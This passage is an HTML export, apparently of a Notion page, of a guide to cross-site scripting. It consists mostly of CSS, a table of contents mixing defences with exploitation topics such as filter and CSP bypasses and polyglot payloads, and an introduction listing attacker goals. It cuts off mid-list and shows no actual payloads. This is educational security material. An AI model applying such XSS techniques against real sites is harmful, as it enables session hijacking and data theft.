@@ -1,0 +1,1017 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>XSS (Cross-Site Scripting) - Comprehensive Guide</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+/* Override strong tags inside headings to maintain consistent weight */
+h1 strong,
+h2 strong,
+h3 strong {
+	font-weight: 600;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 10px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.collection-content td {
+	white-space: pre-wrap;
+	word-break: break-word;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+	margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-flex;
+	align-items: center;
+	justify-content: center;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.callout img.notion-static-icon {
+	width: 1em;
+	height: 1em;
+}
+
+.callout p {
+	margin: 0;
+}
+
+.callout h1,
+.callout h2,
+.callout h3 {
+	margin: 0 0 0.6rem;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+blockquote.quote-large {
+	font-size: 1.25em;
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(44, 44, 43, 1);
+}
+.highlight-gray {
+	color: rgba(125, 122, 117, 1);
+	fill: rgba(125, 122, 117, 1);
+}
+.highlight-brown {
+	color: rgba(159, 118, 90, 1);
+	fill: rgba(159, 118, 90, 1);
+}
+.highlight-orange {
+	color: rgba(210, 123, 45, 1);
+	fill: rgba(210, 123, 45, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 148, 52, 1);
+	fill: rgba(203, 148, 52, 1);
+}
+.highlight-teal {
+	color: rgba(80, 148, 110, 1);
+	fill: rgba(80, 148, 110, 1);
+}
+.highlight-blue {
+	color: rgba(56, 125, 201, 1);
+	fill: rgba(56, 125, 201, 1);
+}
+.highlight-purple {
+	color: rgba(154, 107, 180, 1);
+	fill: rgba(154, 107, 180, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(207, 81, 72, 1);
+	fill: rgba(207, 81, 72, 1);
+}
+.highlight-default_background {
+	color: rgba(44, 44, 43, 1);
+}
+.highlight-gray_background {
+	background: rgba(42, 28, 0, 0.07);
+}
+.highlight-brown_background {
+	background: rgba(139, 46, 0, 0.086);
+}
+.highlight-orange_background {
+	background: rgba(224, 101, 1, 0.129);
+}
+.highlight-yellow_background {
+	background: rgba(211, 168, 0, 0.137);
+}
+.highlight-teal_background {
+	background: rgba(0, 100, 45, 0.09);
+}
+.highlight-blue_background {
+	background: rgba(0, 124, 215, 0.094);
+}
+.highlight-purple_background {
+	background: rgba(102, 0, 178, 0.078);
+}
+.highlight-pink_background {
+	background: rgba(197, 0, 93, 0.086);
+}
+.highlight-red_background {
+	background: rgba(223, 22, 0, 0.094);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(125, 122, 117, 1);
+	fill: rgba(125, 122, 117, 1);
+}
+.block-color-brown {
+	color: rgba(159, 118, 90, 1);
+	fill: rgba(159, 118, 90, 1);
+}
+.block-color-orange {
+	color: rgba(210, 123, 45, 1);
+	fill: rgba(210, 123, 45, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 148, 52, 1);
+	fill: rgba(203, 148, 52, 1);
+}
+.block-color-teal {
+	color: rgba(80, 148, 110, 1);
+	fill: rgba(80, 148, 110, 1);
+}
+.block-color-blue {
+	color: rgba(56, 125, 201, 1);
+	fill: rgba(56, 125, 201, 1);
+}
+.block-color-purple {
+	color: rgba(154, 107, 180, 1);
+	fill: rgba(154, 107, 180, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(207, 81, 72, 1);
+	fill: rgba(207, 81, 72, 1);
+}
+.block-color-default_background {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray_background {
+	background: rgba(240, 239, 237, 1);
+}
+.block-color-brown_background {
+	background: rgba(245, 237, 233, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 235, 222, 1);
+}
+.block-color-yellow_background {
+	background: rgba(249, 243, 220, 1);
+}
+.block-color-teal_background {
+	background: rgba(232, 241, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(229, 242, 252, 1);
+}
+.block-color-purple_background {
+	background: rgba(243, 235, 249, 1);
+}
+.block-color-pink_background {
+	background: rgba(250, 233, 241, 1);
+}
+.block-color-red_background {
+	background: rgba(252, 233, 231, 1);
+}
+.select-value-color-default { background-color: rgba(42, 28, 0, 0.07); }
+.select-value-color-gray { background-color: rgba(28, 19, 1, 0.11); }
+.select-value-color-brown { background-color: rgba(127, 51, 0, 0.156); }
+.select-value-color-orange { background-color: rgba(196, 88, 0, 0.203); }
+.select-value-color-yellow { background-color: rgba(209, 156, 0, 0.282); }
+.select-value-color-green { background-color: rgba(0, 96, 38, 0.156); }
+.select-value-color-blue { background-color: rgba(0, 118, 217, 0.203); }
+.select-value-color-purple { background-color: rgba(92, 0, 163, 0.141); }
+.select-value-color-pink { background-color: rgba(183, 0, 78, 0.152); }
+.select-value-color-red { background-color: rgba(206, 24, 0, 0.164); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="2d5562ad-76f0-808a-9d5c-dcac50e05ee9" class="page mono"><header><h1 class="page-title" dir="auto"><strong>XSS (Cross-Site Scripting) - Comprehensive Guide</strong></h1><p class="page-description" dir="auto"></p></header><div class="page-body"><div style="display:contents" dir="ltr"><nav id="2d5562ad-76f0-80c4-9026-db323f486422" class="block-color-gray table_of_contents"><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2d5562ad-76f0-809b-bbb3-c5ed73b15bd4"><strong>Introduction</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-80a7-b02a-cd7b058e619c"><strong>What XSS is Used For</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8030-8df8-fb3f69f59219"><strong>Why XSS is Dangerous</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2d5562ad-76f0-802a-8286-ec9d39bb9655"><strong>What is XSS</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8029-8e4e-eed5fa70c80a"><strong>Basic Example</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2d5562ad-76f0-805b-a150-d518710110df"><strong>Types of XSS Attacks</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-80c5-b81a-ec2ac32390a3"><strong>1. Reflected XSS (Non-Persistent)</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8082-baa7-f36a3b6d9099"><strong>2. Stored XSS (Persistent)</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-80d9-a1a7-cf88ed9ea05d"><strong>3. DOM-Based XSS</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2d5562ad-76f0-8041-8bdd-c5193fce412e"><strong>How XSS Works</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-80fb-a61c-f6f397b12374"><strong>Attack Flow</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2d5562ad-76f0-803c-af0c-d81453c55006"><strong>Impact of XSS</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-80ee-aa08-c494fabbebaf"><strong>1. Session Hijacking</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8052-8626-e0daf292f4a9"><strong>2. Defacement</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8013-bb94-e549d2cb550b"><strong>3. Keylogging</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-808c-8099-c991d04fbef2"><strong>4. Phishing</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-80cc-ba2d-f03e76a2d2b6"><strong>5. Redirect Attacks</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2d5562ad-76f0-807c-9803-dd27d3a9ab6f"><strong>Mitigation Strategies</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-800c-aad8-e71b12031b16"><strong>1. Output Encoding (Primary Defense)</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-805c-bacd-d012c3954fd4"><strong>2. Content Security Policy (CSP)</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-801c-9ad7-f7700f052dc7"><strong>3. HttpOnly Cookies</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8020-9ba0-dae3b8455402"><strong>4. Input Validation</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-80d8-b78e-d2006d4b5a72"><strong>5. Use Safe DOM Manipulation</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2d5562ad-76f0-805e-ac39-fcb15696d510"><strong>Best Practices</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-80ef-af5c-ec89014edc90"><strong>1. Always Encode Output</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-80b2-951b-c4b67ca0b11e"><strong>2. Use Framework Auto-Escaping</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8014-8a45-ebd2f72ae690"><strong>3. Implement CSP</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-805a-bed1-cba5d3901ff5"><strong>4. Use HttpOnly Cookies</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8007-b92c-cb28541f01d8"><strong>5. Avoid Dangerous Functions</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2d5562ad-76f0-8074-9ea5-fc12344062d6"><strong>Advanced Exploitation Techniques</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8043-886b-cfceec8c2c6b"><strong>1. Bypassing Basic Filters</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-80c8-9ce7-f1320d2231c6"><strong>2. Bypassing CSP</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-80ed-91e6-f6bc8d259352"><strong>3. DOM-Based XSS Bypass</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-809e-a085-d9b8ff8d7c25"><strong>4. Polyglot XSS Payloads</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2d5562ad-76f0-8045-b68c-cedf577feec9"><strong>Penetration Testing Methodology</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8076-a830-d5b30a6196bf"><strong>XSS Testing Checklist</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8063-bfc3-d0af1c7c42c5"><strong>Testing Tools</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2d5562ad-76f0-80be-9a68-feb107b61f94"><strong>Threat Modeling (STRIDE Framework)</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8079-8c05-decbcf7d2d12"><strong>Spoofing</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8061-bf73-e7f4028c3b4e"><strong>Tampering</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8007-b47f-e426c375de1d"><strong>Repudiation</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8026-a705-d7c68307a1eb"><strong>Information Disclosure</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-808e-8151-ceaf90e0b3e0"><strong>Denial of Service</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8070-8cc6-c98a655c023d"><strong>Elevation of Privilege</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2d5562ad-76f0-80dc-b1cb-f415c3a8441e"><strong>Real-World Case Studies</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8009-9484-c1dc96bac047"><strong>Case Study 1: Stored XSS in Comment System</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8004-a258-e9025bb04a43"><strong>Case Study 2: Reflected XSS in Search Functionality</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2d5562ad-76f0-80c8-a691-ca018bc83f93"><strong>Advanced Mitigations</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8085-b2c2-c4538d534889"><strong>Defense in Depth Strategy</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2d5562ad-76f0-8053-bdae-ec4490cbbb16"><strong>SAST/DAST Detection</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8087-8078-c90b748a241f"><strong>SAST (Static Application Security Testing)</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8037-9013-c9111b96aaf7"><strong>DAST (Dynamic Application Security Testing)</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2d5562ad-76f0-8090-a34d-d7c9a2c224af"><strong>Risk Assessment</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-802a-83f6-f3e2477526cc"><strong>Risk Matrix</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8062-9131-e7326868b62f"><strong>Risk Calculation</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2d5562ad-76f0-809c-8ded-eec3325b8931"><strong>Summary</strong></a></div></nav></div><div style="display:contents" dir="auto"><h2 id="2d5562ad-76f0-809b-bbb3-c5ed73b15bd4" class=""><strong>Introduction</strong></h2></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80cb-9796-e876a6492c38" class="">XSS (Cross-Site Scripting) is a security vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. It ranks #3 in OWASP Top 10 (2017) and is one of the most common web application vulnerabilities.</p></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-80a7-b02a-cd7b058e619c" class=""><strong>What XSS is Used For</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80fd-80cb-ec960256179f" class="">Attackers use XSS to:</p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80f4-a6fa-d7167d8de0bf" class="bulleted-list"><li style="list-style-type:disc"><strong>Steal session cookies</strong> and hijack user sessions</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-807e-8c01-fb7a3e3b81cf" class="bulleted-list"><li style="list-style-type:disc"><strong>Deface websites</strong> or modify content</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80ca-b1e8-f1b5155c9383" class="bulleted-list"><li style="list-style-type:disc"><strong>Steal sensitive data</strong> (credentials, personal information)</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80db-bdc0-c1cfcb1edc37" class="bulleted-list"><li style="list-style-type:disc"><strong>Perform actions</strong> on behalf of users</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8008-b7e3-fa586728e8d2" class="bulleted-list"><li style="list-style-type:disc"><strong>Deliver malware</strong> or 